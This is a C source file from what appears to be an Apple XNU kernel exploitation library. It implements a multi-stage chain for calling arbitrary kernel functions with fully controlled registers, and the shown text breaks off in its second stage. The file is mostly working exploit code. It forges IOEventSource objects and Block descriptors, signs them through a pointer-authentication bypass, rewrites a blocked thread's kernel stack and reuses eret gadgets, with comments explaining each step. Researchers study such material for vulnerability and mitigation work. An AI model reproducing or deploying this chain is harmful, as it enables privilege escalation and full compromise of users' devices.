//
//  kfunc.c
//  libxe
//
//  Created by admin on 2/16/22.
//

#include <assert.h>
#include <stdlib.h>

#include "util/kfunc.h"
#include "memory/kmem.h"
#include "slider/kernel.h"
#include "util/ptrauth.h"
#include "util/zalloc.h"
#include "util/kalloc_heap.h"
#include "util/pacda.h"
#include "util/assert.h"
#include "util/lck_rw.h"
#include "util/dispatch.h"
#include "util/ptrauth.h"
#include "util/log.h"
#include "xnu/proc.h"
#include "xnu/thread.h"
#include "iokit/io_surface.h"
#include "iokit/os_dictionary.h"
#include "allocator/small_mem.h"
#include "allocator/large_mem.h"
#include "util/misc.h"
#include "util/asm.h"

#include <macos/kernel.h>
#include <macos/kernel/xnu/osfmk/mach/arm/thread_status.h>


///
/// This module allows calling aribitary kernel functions with controlled values in
/// registers x0 - x30, sp and q0 - q31. To achieve this, the implementation uses
/// a three link chain
///
/// Link 0:- This link works by creating fake `IOEventSource` instances with fake
/// blocks assigned to`event->actionBlock` pointer. These fake blocks uses
/// small block descriptors and have `BLOCK_HAS_COPY_DISPOSE` flag
/// set. The fake blocks' `block->descriptor` value will be pointing to a fake small
/// descriptor. This descriptor will have `desc->dispose` value adjusted to point to
/// arbitary kernel functions. The PACDA vulnerability exploited in `utils/pacda.c`
/// is used to sign the fake IOEventSource vtables and `block->descriptor` pointer.
/// When the fake `IOEventSource` is released, the method `Block_release`
/// will be called to release the fake `IOEventSource::actionBlock` which would
/// call be dispose helper leading to arbitary kernel function execution. This
/// link can only be used for calling very limited number of kernel functions
/// since none of the arguments to the called function can be fully controlled.
/// The first argument to the called function will always be a pointer to a kernel
/// memory location (`struct Block_layout`) and we can have partial control over
/// the data in this memory location (Apart from fields `block->flag` and
/// `block->descriptor` no other fields are used when `Block_release` is called).
/// With some modification we can get control over callee-saved saved registers
/// by using the same techinique we used in the PACDA exploit `utils/pacda.c`.
/// This link is used to call Link 1 with partially controlled values in memory pointed
/// by x0 and controlled values in `x20` and `x21` registers
///
/// Link 1: This link uses part of `arm64_thread_exception_return` to load values of
/// registers `x0`, `x4` and `sp` from memory pointed by register `x0` and then it
/// branches using `eret` instruction to the address in `x20` register. Link 0 will be
/// setting the value of registers `x20 = entry point to Link 2`, `x21 = 0x40008` before
/// calling Link 1. The reason for not using this link to directly call target function is
/// because we only have partial controll over data in memory pointed by x0. Even
/// though registers `x0 - x29`, `sp` and `q0-q31` are loaded from memory pointed by
/// `x0`, not all of these values can be controlled due to overlap with the fields of
/// `struct Block_layout`
///
/// Link 2: This link uses part of `hv_eret_to_guest` method to load the values of
/// registers `x0 - x30` and `q0 - q31` from memory pointed by `x0` and then it uses
/// `eret` instruction to branch to address in register `x4`. Both `x0` and `x4` registers
/// are set with controlled values by Link 1, which allows us to call any arbitary
/// kernel function with fully controlled `x0 - x30` and `q0 - q31` register values.
///
///


#define ARM64_THREAD_ERET_ENTRY_OFFSET 0x38
#define HV_ERET_TO_GUEST_ENTRY_OFFSET 0xc0

#define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_OFFSET 0x24
#define LR_IS_IO_CONNECT_METHOD_OFFSET 0x194
#define LR_BLOCK_RELEASE_DISPOSE_HELPER_OFFSET 0x13c

#define ERET2_ARGS_SIZE (1 << 30)

enum {
    BLOCK_DEALLOCATING          = (0x0001),
    BLOCK_REFCOUNT_MASK         = (0xfffe),
    BLOCK_INLINE_LAYOUT_STRING  = (1 << 21),
    BLOCK_SMALL_DESCRIPTOR      = (1 << 22),
    BLOCK_IS_NOESCAPE           = (1 << 23),
    BLOCK_NEEDS_FREE            = (1 << 24),
    BLOCK_HAS_COPY_DISPOSE      = (1 << 25),
    BLOCK_HAS_CTOR              = (1 << 26),
    BLOCK_IS_GC                 = (1 << 27),
    BLOCK_IS_GLOBAL             = (1 << 28),
    BLOCK_USE_STRET             = (1 << 29),
    BLOCK_HAS_SIGNATURE         = (1 << 30),
    BLOCK_HAS_EXTENDED_LAYOUT   = (1 << 31)
};


#define FAKE_BLOCK_ENABLED_FLAGS (BLOCK_SMALL_DESCRIPTOR | BLOCK_NEEDS_FREE | BLOCK_HAS_COPY_DISPOSE)
#define FAKE_BLOCK_DISABLED_FLAGS (BLOCK_IS_GLOBAL)
#define FAKE_BLOCK_REFCOUNT_MASK (BLOCK_REFCOUNT_MASK)
#define FAKE_BLOCK_SIZE 6144


// MARK: - Link 0
///
/// Block objects may have copy and dispose helper functions synthesized by the compiler.
/// These helper functions are used in `_Block_copy` and `_Block_release` methods and they
/// help copying / releasing a Block when they are copied to or released from the heap.
///
/// struct Block_layout {
///     void *isa;
///     volatile int32_t flags; // contains ref count
///     int32_t reserved;
///     BlockInvokeFunction invoke;
///     struct Block_descriptor_1 *descriptor;
///     // imported variables
/// };
///
/// The flag `BLOCK_HAS_COPY_DISPOSE` will be set on the block when the block has
/// a copy / dispose helper and the associated block descriptor stores reference to these
/// synthesized helper functions. When the block is using small descriptor format, the flag
/// `BLOCK_SMALL_DESCRIPTOR` is set and the descriptor will be of following format
///
/// struct Block_descriptor_small {
///     uint32_t size;
///
///     int32_t signature;
///     int32_t layout;
///
///     /* copy & dispose are optional, only access them if
///     *        Block_layout->flags & BLOCK_HAS_COPY_DIPOSE */
///
///     // ***NOTE***: This 32-bit integers stores the relative offset to the function from
///     //                      address of the respective field.
///     int32_t copy;
///     int32_t dispose;
/// };
///
/// The method `Block_release` is used for releasing a block and this method calls the method
/// `_Block_call_dispose_helper` method to trigger the associated dispose helper when there
/// are no more references to the block as shown below:
///
/// void
/// _Block_release(const void *arg)
/// {
///     struct Block_layout *aBlock = (struct Block_layout *)arg;
///     if (!aBlock) {
///         return;
///     }
///
///     if (aBlock->flags & BLOCK_IS_GLOBAL) {
///         return;
///     }
///     if (!(aBlock->flags & BLOCK_NEEDS_FREE)) {
///         return;
///     }
///
///     if (latching_decr_int_should_deallocate(&aBlock->flags)) {
///         _Block_call_dispose_helper(aBlock);
///         _Block_destructInstance(aBlock);
///         free(aBlock);
///     }
/// }
///
/// The `_Block_call_dispose_helper` method calls `_Block_get_dispose_function` method
/// to compute the address of the dispose helper function and then it calls that function as
/// shown below:
///
/// static void
/// _Block_call_dispose_helper(struct Block_layout *aBlock)
/// {
///     if (auto *pFn = _Block_get_dispose_function(aBlock)) {
///         pFn(aBlock);
///     }
/// }
///
/// The `_Block_get_dispose_function` calls the macro `_Block_get_relative_function_pointer` to
/// compute the address of dispose helper function as shown below:
///
/// static inline __typeof__(void (*)(const void *))
/// _Block_get_dispose_function(struct Block_layout *aBlock)
/// {
///     if (!(aBlock->flags & BLOCK_HAS_COPY_DISPOSE)) {
///         return NULL;
///     }
///     void *desc = _Block_get_descriptor(aBlock);
///     if (aBlock->flags & BLOCK_SMALL_DESCRIPTOR) {
///         struct Block_descriptor_small *bds =
///             (struct Block_descriptor_small *)desc;
///         return _Block_get_relative_function_pointer(
///                 bds->dispose, void (*)(const void *));
///     }
///
///     struct Block_descriptor_2 *bd2 =
///         (struct Block_descriptor_2 *)((unsigned char *)desc +
///             sizeof(struct Block_descriptor_1));
///
///     return _Block_get_dispose_fn(bd2);
/// }
///
/// The `_Block_get_relative_function_pointer` computes the address of dispose helper by
/// adding the address of field `desc->dispose` with value of `desc->dispose`. The resulting
/// value is signed using IA pointer authentication key by calling the method
/// `ptrauth_sign_unauthenticated` as shown below:
///
/// #define _Block_get_relative_function_pointer(field, type)           \
///     ((type)ptrauth_sign_unauthenticated(                              \
///         (void *)((uintptr_t)(intptr_t)(field) + (uintptr_t)&(field)), \
///         ptrauth_key_function_pointer, 0))
///
/// To prevent an attacker from modifying the `copy` or `dispose` field of the descriptor of a
/// block using small descriptor format and achieving arbitary kernel function execution, the
/// following defenses are present
///
/// 1. The small block descriptors are always stored in the `__DATA_CONST` region of the
///   binary image. This prevents an attacker from directly modifying the `copy` or `dispose`
///   field of an already existing small block descriptor.
/// 2. The pointer used to store the address of descriptor in `struct Block_layout` is signed
///   using DA pointer authentication key. This prevents an attacker from creating a fake
///   block descriptor and assigning it to `block->descriptor`.
///
/// Since we already have a method to sign aribitary pointers with arbitary context using DA
/// authenication key (See util/pacda.c), we can bypass the 2nd defense and create fake
/// small block descriptors, sign and assign them to `block->descriptor` field and trigger their
/// dispose helper functions by triggering the `_Block_release` function of the associated
/// block to achive arbitary kernel function execution.
///
/// To trigger the `Block_release` method from user land, we create fake `IOEventSource`
/// with `event_source->actionBlock` pointing to the fake block. Then we will create a
/// new `IOSurface` using `IOSurfaceCreate` method and we will add the fake event source
/// as a value to a key in the `props` dictionary (Dictionary which stores the key value pairs
/// set using `IOSurfaceSetValue` method) of the `IOSurface`. Then we will  call
/// `IOSurfaceRemoveValue` method to remove the fake event source, which will trigger
/// the `Block_release` function. The `Block_release` function will trigger the dispose helper
/// of the fake block leading to arbitary kernel function execution.
///
/// Since the Link 1 also requires control over registers `x20` and `x21`, we will use the techinque
/// used in `utils/pacda.c` to load callee-saved registers with controlled values when they are
/// restored from the stack. To do this we assign fake values to `event_source->reserved` and
/// `event_source->reserved->counter` fields. This will lead to the method
/// `IOStatistics::unregisterEventSource` from being called when the event source is released.
/// This method acquires exclusive lock on read write lock `iostatistics->lock`. By acquring this
/// lock before releasing the event source, we can make the program execution get paused
/// waiting for this lock to release and we can modify kernel stack such that values of `x20` and
/// `x21` can be controlled once the `IOStastics::unregisterEventSource` method returns.
/// Since the `Block_release` method is called immediatly after this method and since `Block_release`
/// method does not use `x20` and `x21` registers, the dispose helper pointing to Link 1 will
/// be called with controlled `x20` and `x21` values.
///


typedef struct link0 {
    uintptr_t free_zone;
    
    uintptr_t io_event_source;
    uintptr_t io_event_source_vtable;
    uintptr_t block;
    uintptr_t block_descriptor;
    
    xe_util_zalloc_t io_event_source_allocator;
    xe_util_zalloc_t block_allocator;
    xe_util_zalloc_t reserved_allocator;
    xe_util_zalloc_t counter_allocator;
    
    xe_util_lck_rw_t     iostatistics_lock;
    IOSurfaceRef         iosurface;
    uintptr_t            lr_stack_ptr;
    dispatch_semaphore_t sem_iosurface_done;
    
    enum {
        LINK_STATE_CREATED,
        LINK_STATE_PREPARED,
    } state;
}* link0_t;


struct xe_util_kfunc_register_state {
    uint64_t x19, x20, x21, x22;
    uint64_t x23, x24, x25, x26;
    uint64_t fp, sp, lr;
};


struct xe_util_kfunc_args {
    uint64_t  x[29];
    uint64_t  fp;
    uint64_t  lr;
    uint64_t  sp;
    uint128_t q[31];
};


void xe_util_kfunc_link0_create_fake_block(link0_t link0) {
    xe_assert_cond(link0->block_allocator, !=, NULL);
    uintptr_t block = xe_util_zalloc_alloc(link0->block_allocator, 0);
    uintptr_t descriptor = xe_util_pacda_sign_with_descriminator(link0->free_zone, block + TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_DESCRIMINATOR);
    
    link0->block = block;
    link0->block_descriptor = descriptor;
}


void xe_util_kfunc_link0_reset_fake_block(link0_t link0) {
    uintptr_t block = xe_util_zalloc_alloc(link0->block_allocator, 0);
    xe_assert_cond(block, ==, link0->block);
}


void xe_util_kfunc_link0_create_fake_io_event_source(link0_t link0) {
    xe_assert_cond(link0->io_event_source_allocator, !=, NULL);
    
    uintptr_t event_source = xe_util_zalloc_alloc(link0->io_event_source_allocator, 0);
    uintptr_t vtable = xe_util_pacda_sign_with_descriminator( xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_VTABLE + 0x10), event_source, TYPE_IO_EVENT_SOURCE_MEM_VTABLE_DESCRIMINATOR);
    
    link0->io_event_source = event_source;
    link0->io_event_source_vtable = vtable;
}


void xe_util_kfunc_link0_reset_fake_io_event_source(link0_t link0) {
    uintptr_t event_source = xe_util_zalloc_alloc(link0->io_event_source_allocator, 0);
    xe_assert_cond(event_source, ==, link0->io_event_source);
}


void xe_util_kfunc_link0_init(link0_t link0, int free_zone_index) {
    /// The small block descriptor stores the relative offset to the dispose function
    /// as a signed 32 bit integer. This allows us to call only functions within 2GB
    /// range from the address of `dispose` field in the small block descriptor.
    ///
    /// Placing the fake block descriptor in the `__DATA` region of the kernel image
    /// will allow us to call any arbitary kernel function.
    ///
    /// The length of zone_array is 650 and each element in the zone array is of
    /// size 168 bytes. This zone_array have unused elements in them and we use
    /// one of these unused slots to store the fake small block descriptor
    uintptr_t free_zone = xe_util_zalloc_find_zone_at_index(free_zone_index);
    xe_assert_cond(xe_kmem_read_uint64(free_zone, 0), ==, 0);
    
    /// Used for allocating memory for fake IOEventSource
    xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
    
    /// Used for allocating memory for fake `IOEventSource::reserved` field
    xe_util_zalloc_t reserved_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_RESERVED_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
    
    /// Used for allocating memory for fake `IOEventSourceCounter`
    xe_util_zalloc_t counter_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_COUNTER_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
    
    /// Used for allocating memory for fake Block
    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), FAKE_BLOCK_SIZE), 1);
    
    bzero(link0, sizeof(*link0));
    link0->state = LINK_STATE_CREATED;
    link0->free_zone = free_zone;
    link0->io_event_source_allocator = io_event_source_allocator;
    link0->reserved_allocator = reserved_allocator;
    link0->counter_allocator = counter_allocator;
    link0->block_allocator = block_allocator;
    xe_util_kfunc_link0_create_fake_io_event_source(link0);
    xe_util_kfunc_link0_create_fake_block(link0);
}


void xe_util_kfunc_link0_prepare_fake_event_source(link0_t link0) {
    uintptr_t event_source = link0->io_event_source;
    xe_kmem_write_uint64(event_source, TYPE_OS_OBJECT_MEM_VTABLE_OFFSET, link0->io_event_source_vtable);
    
    /// Set the reference count to 1 so that the event source will be released when
    /// it is remove the `IOSurface` props dictionary
    uint32_t ref_count = 1 | (1ULL << 16);
    xe_kmem_write_uint32(event_source, TYPE_OS_OBJECT_MEM_RETAIN_COUNT_OFFSET, ref_count);
    
    xe_kmem_write_uint64(event_source, TYPE_IO_EVENT_SOURCE_MEM_ACTION_BLOCK_OFFSET, link0->block);
    
    /// Set flag `kActionBlock` on `event_source->flags` field. This flag must be set
    /// for `IOEventSource::free` method to call `Block_release` function
    xe_kmem_write_uint32(event_source, TYPE_IO_EVENT_SOURCE_MEM_FLAGS_OFFSET, 0x4);
    
    
    /// Required for triggering `IOStatistics::unregisterEventSource` method
    uintptr_t reserved = xe_util_zalloc_alloc(link0->reserved_allocator, 0);
    xe_kmem_write_uint64(event_source, TYPE_IO_EVENT_SOURCE_MEM_RESERVED_OFFSET, reserved);
    uintptr_t counter = xe_util_zalloc_alloc(link0->counter_allocator, 0);
    xe_kmem_write_uint64(reserved, 0, counter);
}


void xe_util_kfunc_link0_prepare_fake_block_descriptor(link0_t link0, uintptr_t target_func) {
    /// Calculate relative offset of target func from address of `desc->dispose` field
    int64_t diff = (target_func - xe_ptrauth_strip(link0->block_descriptor) - TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET);
    xe_assert(diff >= INT32_MIN && diff <= INT32_MAX);
    xe_kmem_write_int32(xe_ptrauth_strip(link0->block_descriptor), TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET, (int32_t)diff);
}


void xe_util_kfunc_link0_prepare_fake_block(link0_t link0, const void* block_data, size_t block_data_size) {
    xe_assert_cond(block_data_size, >=, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET + sizeof(uintptr_t));
    xe_assert_cond(block_data_size, <=, FAKE_BLOCK_SIZE);
    
    /// Make sure these flags are set on the block data. These flags are required for
    /// triggering the dispose helper when the block is released
    const uint32_t required_flags = BLOCK_SMALL_DESCRIPTOR | BLOCK_NEEDS_FREE | BLOCK_HAS_COPY_DISPOSE;
    uint32_t flags = *((uint32_t*)(block_data + TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET));
    xe_assert_cond(flags & required_flags, ==, required_flags);
    
    /// Make sure these flags are not set. These flags must not be set for triggering
    /// dispose helper when the block is released
    const uint32_t disabled_flags = BLOCK_IS_GLOBAL;
    xe_assert_cond(flags & disabled_flags, ==, 0);
    
    /// Make sure the descriptor in block_data is set to correct value
    uintptr_t descriptor = *((uintptr_t*)(block_data + TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET));
    xe_assert_cond(descriptor, ==, link0->block_descriptor);
    
    xe_kmem_write(link0->block, 0, (void*)block_data, block_data_size);
}


uintptr_t xe_util_kfunc_get_lr_unregister_event_source(void) {
    /// Get the link register for branch with link call to `IOStatistics::unregisterEventSource`
    /// from method `IOEventSource::free`
    uintptr_t lr_unregister_event_source = xe_slider_kernel_slide(FUNC_IO_EVENT_SOURCE_FREE_ADDR) + LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_OFFSET;
    
    /// Verify we got the right link register value
    xe_assert_cond(xe_kmem_read_uint32(lr_unregister_event_source - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_ADDR), lr_unregister_event_source - 4));
    
    return lr_unregister_event_source;
}


uintptr_t xe_util_kfunc_get_lr_is_io_connect_method(void) {
    /// Get the link register for branch with link call to `is_io_connect_method` from
    /// method `_Xio_connect_method`
    uintptr_t lr_is_io_connect_method = xe_slider_kernel_slide(FUNC_XIO_CONNECT_METHOD_ADDR) + LR_IS_IO_CONNECT_METHOD_OFFSET;
    
    xe_assert_cond(xe_kmem_read_uint32(lr_is_io_connect_method - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_IS_IO_CONNECT_METHOD_ADDR), lr_is_io_connect_method - 4));
    
    return lr_is_io_connect_method;
}


uintptr_t xe_util_kfunc_get_lr_block_dispose_helper(void) {
    /// Get the link register for branch with link call to dispose helper from
    /// `Block_release` method
    uintptr_t lr_block_dispose_helper = xe_slider_kernel_slide(FUNC_BLOCK_RELEASE_ADDR) + LR_BLOCK_RELEASE_DISPOSE_HELPER_OFFSET;
    
    /// mov x17, #0x2abe
    xe_assert_cond(xe_kmem_read_uint32(lr_block_dispose_helper - 8, 0), ==, 0xd28557d1);
    /// blraa x8, 17
    xe_assert_cond(xe_kmem_read_uint32(lr_block_dispose_helper - 4, 0), ==, 0xd73f0911);
    
    return lr_block_dispose_helper;
}


void xe_util_kfunc_link0_ensure_iostatstics_lock(void) {
    /// The `IOStatistics` is only enabled when `kIOStatistics` flag is set on `gIOKitDebug`
    /// global variable. If `IOStatistics` is not enabled, the `iostatistics->lock` would be null.
    /// We will setup a fake lock if it is NULL. This lock is required to get control over
    /// callee-saved registers when `Block_release` is called
    if (!xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0)) {
        xe_log_debug("initializing gIOStastics Lock");
        uintptr_t lock = xe_allocator_small_allocate_disowned(16);
        uintptr_t data[2];
        data[0] = 0x420000;
        data[1] = 0;
        xe_kmem_write(lock, 0, data, sizeof(data));
        xe_kmem_write_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0, lock);
    }
}


struct xe_util_kfunc_register_state xe_util_kfunc_link0_pre_execute(link0_t link0) {
    xe_assert_cond(link0->state, ==, LINK_STATE_CREATED);
    uintptr_t lr_unregister_event_source = xe_util_kfunc_get_lr_unregister_event_source();
    uintptr_t lr_is_io_connect_method = xe_util_kfunc_get_lr_is_io_connect_method();
    uintptr_t lr_block_dispose_helper = xe_util_kfunc_get_lr_block_dispose_helper();
    
    xe_util_kfunc_link0_prepare_fake_event_source(link0);
    
    uintptr_t surface;
    IOSurfaceRef surface_ref = xe_io_surface_create(&surface);
    IOSurfaceSetValue(surface_ref, CFSTR("xe_util_kfunc_key"), kCFBooleanTrue);
    
    /// Change the value associated with key "xe_util_kfunc_key" to created
    /// fake `IOEventSource`
    uintptr_t props = xe_kmem_read_uint64(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
    int error = xe_os_dictionary_set_value_of_key(props, "xe_util_kfunc_key", link0->io_event_source);
    xe_assert_err(error);
    
    /// Make sure `IOStatistics::lock` is not NULL
    xe_util_kfunc_link0_ensure_iostatstics_lock();
    
    /// Acquire exclusive lock on read write lock `IOStatistics::lock`
    xe_util_lck_rw_t iostatistics_lock = xe_util_lck_rw_lock_exclusive( xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0));
    
    /// Trigger `IOEventSource::free` method of the fake event source in a separate
    /// background thread. This thread will be blocked until `IOStatistics::lock` is released
    uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
    dispatch_semaphore_t sem_surface_destroying = dispatch_semaphore_create(0);
    dispatch_semaphore_t sem_surface_destroyed = dispatch_semaphore_create(0);
    dispatch_async(xe_dispatch_queue(), ^() {
        *waiting_thread = xe_xnu_thread_current_thread();
        dispatch_semaphore_signal(sem_surface_destroying);
        xe_log_debug("io_surface remove value start");
        IOSurfaceRemoveValue(surface_ref, CFSTR("xe_util_kfunc_key"));
        xe_log_debug("io_surface remove value done");
        dispatch_semaphore_signal(sem_surface_destroyed);
    });
    
    dispatch_semaphore_wait(sem_surface_destroying, DISPATCH_TIME_FOREVER);
    dispatch_release(sem_surface_destroying);
    
    /// Wait until `IOStatistics::unregisterEventSource` method tries to acquire `IOStatistics::lock`
    /// by calling `IORWLockWrite` method
    error = xe_util_lck_rw_wait_for_contention(iostatistics_lock, *waiting_thread, 0, NULL);
    xe_assert_err(error);
    
    struct xe_util_kfunc_register_state register_state;
    bzero(&register_state, sizeof(register_state));
    
    uintptr_t lr;
    /// Find the location of stack used by `IOStatistics::unregisterEventSource` method
    error = xe_xnu_thread_scan_stack(*waiting_thread, lr_unregister_event_source, XE_PTRAUTH_MASK, 1024, &lr);
    xe_assert_err(error);
    
    link0->lr_stack_ptr = lr;
    
    /// Save the values of required callee-saved registers. These registers
    /// must be restored to this values before the dispose function transfers
    /// control back to `Block_release`
    register_state.x19 = link0->block;
    register_state.x20 = xe_kmem_read_uint64(lr, -0x18);
    register_state.x21 = xe_kmem_read_uint64(lr, -0x20);
    register_state.x22 = xe_kmem_read_uint64(lr, -0x28);
    register_state.x23 = xe_kmem_read_uint64(lr, -0x30);
    register_state.x24 = xe_kmem_read_uint64(lr, -0x38);
    register_state.sp = lr - 0x38 + 0x40 - 0x20;
    register_state.fp = register_state.sp + 0x10;
    register_state.lr = lr_block_dispose_helper;
    
    error = xe_xnu_thread_scan_stack(*waiting_thread, lr_is_io_connect_method, XE_PTRAUTH_MASK, 1024, &lr);
    xe_assert_err(error);
    
    register_state.x25 = xe_kmem_read_uint64(lr, -0x40);
    register_state.x26 = xe_kmem_read_uint64(lr, -0x30);
    
    xe_log_debug("backup register values, x19: %p, x20: %p, x21: %p, x22: %p, x23: %p, x24: %p, x25: %p, x26: %p, fp: %p, sp: %p, lr: %p", (void*)register_state.x19, (void*)register_state.x20, (void*)register_state.x21, (void*)register_state.x22, (void*)register_state.x23, (void*)register_state.x24, (void*)register_state.x25, (void*)register_state.x26, (void*)register_state.fp, (void*)register_state.sp, (void*)register_state.lr);
    
    link0->iosurface = surface_ref;
    link0->iostatistics_lock = iostatistics_lock;
    link0->sem_iosurface_done = sem_surface_destroyed;
    link0->state = LINK_STATE_PREPARED;
    return register_state;
}


void xe_util_kfunc_link0_execute(link0_t link0, uintptr_t target_func, uint64_t x20, uint64_t x21, const void* block_data, size_t block_data_size) {
    xe_assert_cond(link0->state, ==, LINK_STATE_PREPARED);
    xe_util_kfunc_link0_prepare_fake_block(link0, block_data, block_data_size);
    
    /// Store the relative target function address to `desc->dispose` member
    xe_util_kfunc_link0_prepare_fake_block_descriptor(link0, target_func);
    
    /// Modify the stack used by `IOStatistics::unregisterEventSource` method
    /// to get desired values in `x20` and `x21` registers once the method returns
    xe_kmem_write_uint64(link0->lr_stack_ptr, -0x18, x20);
    xe_kmem_write_uint64(link0->lr_stack_ptr, -0x20, x21);
    
    /// Release the exclusive lock acquired on `IOStatistics::lock`
    xe_util_lck_rw_lock_done(&link0->iostatistics_lock);
    dispatch_semaphore_wait(link0->sem_iosurface_done, DISPATCH_TIME_FOREVER);
    dispatch_release(link0->sem_iosurface_done);
    link0->sem_iosurface_done = NULL;
    IOSurfaceDecrementUseCount(link0->iosurface);
    link0->iosurface = NULL;
    
    xe_util_kfunc_link0_reset_fake_io_event_source(link0);
    xe_util_kfunc_link0_reset_fake_block(link0);
    link0->state = LINK_STATE_CREATED;
}


void xe_util_kfunc_link0_destroy(link0_t link0) {
    xe_assert_cond(link0->state, ==, LINK_STATE_CREATED);
    xe_util_zalloc_destroy(&link0->io_event_source_allocator);
    xe_util_zalloc_destroy(&link0->block_allocator);
    xe_util_zalloc_destroy(&link0->counter_allocator);
    xe_util_zalloc_destroy(&link0->reserved_allocator);
}


// MARK: - Link 1
/// This link is called by link 0 with x20 = <entry point to link 2> and x21 = 0x40008
/// The memory pointed by x0 is only partially controlled because it is shared by
/// `struct Block_layout` and `struct arm_context`
///
/// The memory pointed by x0 is saved with `struct arm_context` to set value of
/// x4 = target function address and x0 = address of `struct arm_context` with fully
/// controlled data
///
///
/// kernel.release.t6000(21E230)`arm64_thread_exception_return:
/// 0xfffffe0007253be8      mov    x0, sp
/// ...
/// 0xfffffe0007253c1c      bl     ml_check_signed_state
/// 0xfffffe0007253c20      mov    x1, x20                           => ENTRY POINT to the link
/// 0xfffffe0007253c24      mov    x2, x21
/// 0xfffffe0007253c28      msr    SPSel, #0x0
/// 0xfffffe0007253c2c      mov    x30, x3
/// 0xfffffe0007253c30      mov    x3, x22
/// 0xfffffe0007253c34      mov    x4, x23
/// 0xfffffe0007253c38      mov    x5, x24
/// 0xfffffe0007253c3c      ldr      w3, [sp, #0x340]
/// 0xfffffe0007253c40      ldr      w4, [sp, #0x344]
/// 0xfffffe0007253c44      msr    ELR_EL1, x1                   => ELR_EL1 loaded from x1 which is loaded from x20
/// 0xfffffe0007253c48      msr    SPSR_EL1, x2                => SPSR_EL1 loaded from x2 which is loaded from x21
/// ...
/// 0xfffffe0007253cd4      ldp    q0, q1, [x0, #0x140]
/// ...
/// 0xfffffe0007253d10      ldp    q30, q31, [x0, #0x320]      _
/// 0xfffffe0007253d14      ldp    x2, x3, [x0, #0x18]              |
/// ...                                                                                      |
/// 0xfffffe0007253d40      ldp    x26, x27, [x0, #0xd8]          |
/// 0xfffffe0007253d44      ldr    x28, [x0, #0xe8]                   | > Registers x0 - x29 and sp loaded from `struct arm_context`
/// 0xfffffe0007253d48      ldr    x29, [x0, #0xf0]                    |    in memory pointed by x0
/// 0xfffffe0007253d4c      ldr    x1, [x0, #0x100]                   |
/// 0xfffffe0007253d50      mov    sp, x1                                |
/// 0xfffffe0007253d54      ldp    x0, x1, [x0, #0x8]             _ |
/// 0xfffffe0007253d58      eret                                           =>   Restores PSTATE from SPSR_EL1 and branches to ELR_EL1
///


typedef struct link1 {
    uintptr_t x0_arm_context;
    xe_allocator_large_mem_t x0_data_allocator;
}* link1_t;


void xe_util_kfunc_link1_init(link1_t link1) {
    static_assert(offsetof(struct arm_context, ss.uss.x[0]) == TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET, "");
    
    /// As noted in the discussion above, when Link 1 is executed the data in
    /// memory pointed by `x0` is shared between `struct Block_layout` and
    /// `struct arm_context`. The values of members `flags` and `descriptor`
    /// in `struct Block_layout` must be controlled so that `Block_release` will
    /// call the dispose helper of the block. We also need the value of `x[0]` in
    /// `struct arm_context` to point to memory location with fully controlled
    /// data. Since the memory for `context->x[0]` and `desc->flags` overlaps,
    /// we need to set a value in this memory location such that both of them
    /// are valid. This means we need the address for fully controlled data to
    /// have its LSB part equal to `desc->flags` value. The flag `BLOCK_IS_GLOBAL`
    /// is the flag we need to control with largest bit position (1 << 28). So
    /// if we allocate a memory with size (1 << 30) we can always find an
    /// address inside the allocated memory that will have the required flags
    /// value
    size_t allocation_size = (1ULL << 30);
    
    uintptr_t ptr;
    link1->x0_data_allocator = xe_allocator_large_mem_allocate(allocation_size, &ptr);
    
    int32_t flags = (BLOCK_SMALL_DESCRIPTOR | BLOCK_NEEDS_FREE | BLOCK_HAS_COPY_DISPOSE);

    uint64_t x0 = ptr;
    /// Clear all bits from [0...28]
    x0 &= ~((BLOCK_IS_GLOBAL << 1) - 1);
    
    /// If the pointer value dropped below starting address, set the 29th bit to one.
    /// The resulting address will always be in the allocated memory range
    if (x0 < ptr) {
        x0 += allocation_size >> 1;
    }
    
    /// Set the flags to the address
    x0 |= flags;
    
    /// Set the block deallocating flag. We will increment this value by 1
    /// before assigning it to memory location of `block->flags` member
    /// which will clear this flag
    x0 |= BLOCK_DEALLOCATING;
    
    xe_assert_cond(x0, >=, ptr);
    xe_assert_cond(x0 + sizeof(struct arm_context), <, ptr + ERET2_ARGS_SIZE);
    
    /// The controlled data should still be stored at the address with flag
    /// `BLOCK_DEALLOCATING` set because the method `Block_release`
    /// will decrement the reference count and set this flag before calling the
    /// dispose helper
    link1->x0_arm_context = x0;
}


struct link1_requirements {
    uint64_t x20;
    uint64_t x21;
    
    struct arm_context x0_data;
    
    uint64_t pc;
};


